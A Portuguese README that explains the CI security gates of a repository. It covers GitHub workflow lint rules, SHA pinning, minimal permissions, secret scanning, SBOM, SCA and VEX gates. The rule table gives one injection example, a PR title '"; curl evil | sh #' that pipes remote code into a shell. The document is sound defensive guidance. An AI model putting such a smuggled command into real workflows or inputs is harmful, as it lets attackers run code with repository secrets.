# O CI deste repositório

Estes são os portões que rodam em **todo PR** deste repositório. Eles existem porque um projeto
aberto recebe código de estranho: o CI é o caminho mais curto entre um PR e a execução de comando
com os segredos do repositório na mão, e cada regra abaixo fecha uma classe conhecida de ataque.

## Onde cada arquivo mora — e por que ele aparece duas vezes

O GitHub só executa o que está em `.github/`. Este diretório (`oss/ci/`) é a **fonte revisada**; o
que roda é a cópia montada:

| fonte revisada             | o que o GitHub executa    |
|----------------------------|---------------------------|
| `oss/ci/workflows/*.yml`   | `.github/workflows/*.yml` |
| `oss/ci/dependabot.yml`    | `.github/dependabot.yml`  |
| `oss/ci/CODEOWNERS`        | `.github/CODEOWNERS`      |

A montagem é feita na extração deste repositório, e ela **confere byte a byte** que as duas cópias
são idênticas — divergir deixa de ser possível sem reprovar. O motivo de haver duas é concreto: a
suíte pergunta "quem executa o gate de segredo nesta árvore?" varrendo `oss/ci/workflows/`, e é essa
pergunta que impede o gate de virar capacidade declarada sem ninguém a executar.

**Ao editar um workflow, mude os DOIS lados no mesmo commit.** O que o GitHub roda é `.github/`; o
que a suíte lê é `oss/ci/`. Um teste reprova quando eles diferem, então o esquecimento aparece no
próprio PR — mas aparece como falha, e o conserto é mecânico: copie um sobre o outro.

## Por que ele nasce assim

O linter `scripts/security/lint-workflows.mjs` verifica todas as regras abaixo a cada rodada —
inclusive **sobre o próprio `.github/workflows`**, pelo passo *lint dos próprios workflows* do
`ci.yml`. Sem isso, a próxima edição de workflow não teria portão nenhum.

| Regra | O que ela IMPEDE |
|---|---|
| Nunca interpolar `github.event.*` / `github.head_ref` / `github.ref*` / `inputs.*` em `run:` ou `script:` | Título, corpo e nome de branch de um PR são texto do ATACANTE. `${{ }}` é substituído antes de o shell existir, então o texto entra como **programa**: um título `"; curl evil \| sh #` executa. O jeito correto é `env:` + `"$VAR"`, onde o shell trata como dado. |
| `uses:` sempre pinado por SHA de 40 hex | Uma tag é mutável por quem publica a action (ou por quem invade o repositório dela). Tag repontada = execução de código arbitrário no nosso CI com o `GITHUB_TOKEN` na mão. |
| `container:` e `services.<nome>.image` pinados por `@sha256:` | Uma imagem de terceiro roda DENTRO do job, com os secrets dele no ambiente. Mesmo poder de uma action, e por referência mutável. |
| `permissions:` mínimo declarado em todo workflow | Sem declaração, o job herda o default do repositório, que pode ser `write-all`. Declarar o mínimo é o que limita o estrago de um job comprometido. |
| Nunca `pull_request_target` com checkout do ref do PR | Esse gatilho roda com secrets no contexto do repo base; somado ao checkout do PR, é execução direta de código não revisado com segredo disponível. |
| Sem `workflow_run`/`pull_request_target` para tarefa que só precisa ler | Menos gatilho privilegiado, menos superfície. O CI de PR aqui roda com `contents: read` e nada além. |

Fail-closed em dois pontos que costumam ser esquecidos: **YAML que não parseia reprova** (um linter
que devolve zero achados por não ter conseguido ler está afirmando "limpo" sem ter medido) e
**diretório sem workflow reprova** (o gate não pode passar por não ter tido o que examinar).

## Os portões

`ci.yml` (todo PR e push em `main`):

1. **licenças** — `check-licenses.mjs`: recusa dependência copyleft-forte NOVA no fecho de runtime, e
   pacote sem licença declarada (ausente ≠ permissiva: sem concessão explícita o default legal é
   todos-os-direitos-reservados).
2. **lint dos próprios workflows** — o linter roda sobre `.github/workflows`, então o CI se vigia.
3. **typecheck** + **suíte** (vitest).
4. **gate de segredo do snapshot** — varre a ÁRVORE rastreada (não o índice) com
   `--fail-on-unscanned`, escopado pela régua `.ossignore`, para que um ponto cego acidental reprove
   em vez de sair como "liberado".

`security.yml` (PR, push em `main` e semanal):

1. **SBOM** do fecho REAL instalado (CycloneDX 1.6) + divergência árvore × lockfile.
2. **SCA** via OSV (`querybatch` em lotes de 200 + detalhe por advisory) enriquecido com EPSS e o
   catálogo CISA KEV.
3. **VEX** — `vex-gate.mjs` aplica `scripts/security/vex-dispositions.json` e **re-verifica a
   evidência de cada disposição**. Disposição desatualizada REPROVA em vez de silenciar.

O agendamento semanal existe porque advisory novo aparece sem ninguém tocar no código: sem ele, um
repositório sem commits parece seguro por inércia.

## Por que o VEX é requisito e não enfeite

Medido em 2026-07-30 no fecho de `packages/storymap-ui`: 651 componentes, 44 advisories — e **10
deles são de pacote instalado e NÃO executado** (`hono` sozinho responde por 8, incluindo um de CORS
que qualquer `npm audit` vai gritar; ele entra como dependência declarada do SDK do MCP, mas só os
`examples/` do dist o importam). Sem disposição, quem clona o repositório roda `npm audit`, vê a
lista inteira e conclui que o projeto é abandonado — e os advisories que importam de verdade ficam
enterrados no meio.

O SBOM é gerado em **CycloneDX** justamente por isso: ele carrega inventário e VEX no mesmo esquema,
com identidade por `purl`. Em SPDX seriam dois documentos que precisam concordar entre si — e dois
artefatos que precisam concordar sempre divergem.
